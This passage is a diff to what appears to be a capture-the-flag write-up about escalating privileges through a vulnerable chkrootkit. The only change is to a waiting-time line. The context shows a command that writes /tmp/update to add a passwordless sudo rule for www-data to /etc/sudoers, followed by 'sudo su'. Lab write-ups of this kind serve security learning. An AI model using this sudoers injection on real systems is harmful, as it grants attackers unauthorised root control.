@@ -171,7 +171,7 @@ Vulnerable chkrootkit will execute /tmp/update and I could create file named upd
 ```
 www-data@ubuntu:/tmp$ echo 'echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
-Wait for 3 hours...
+Wait for a few minutes...
 ```
 www-data@ubuntu:/tmp$ sudo su
 sudo su
